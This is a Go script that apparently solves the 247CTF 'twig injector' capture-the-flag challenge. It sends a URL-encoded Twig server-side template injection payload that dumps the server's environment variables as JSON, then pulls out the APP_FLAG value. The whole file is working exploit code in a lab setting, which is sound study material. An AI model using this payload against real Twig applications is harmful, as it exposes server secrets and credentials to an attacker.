// Run as,
//
// go run twig_injector.go -url <url>

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

var url string

var injection = "%22{{%20app.request.server.all|json_encode|raw%20}}%22"

func init() {
	const (
		urlUsage = "247ctf instance url"
	)
	flag.StringVar(&url, "url", "", urlUsage)
}

func doRequest(url string) (string, error) {
	r, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer r.Body.Close()
	b, err := io.ReadAll(r.Body)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// Peform HTTP GET request with the twig template
func getFlag(url string) (string, error) {
	var flag string

	craftyUrl := fmt.Sprintf("%sinject?inject=%s", url, injection)
	flag, err := doRequest(craftyUrl)
	if err != nil {
		return "", err
	}
	return flag, nil
}

// Parse the raw string and return the flag
// The key to look for is APP_FLAG
func parseFlag(s string) (string, error) {
	c := make(map[string]json.RawMessage)
	rs := strings.Replace(s, "Welcome to the twig injector!", "", -1)
	err := json.Unmarshal([]byte(rs), &c)
	if err != nil {
		return "", err
	}
	return string(c["APP_FLAG"]), nil
}

func main() {
	flag.Parse()
	fmt.Printf("url: %v\n", url)

	s, err := getFlag(url)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error getting flag: %v\n", err)
		os.Exit(1)
	}

	f, err := parseFlag(s)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error parsing flag: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Flag: %s\n", f)
}
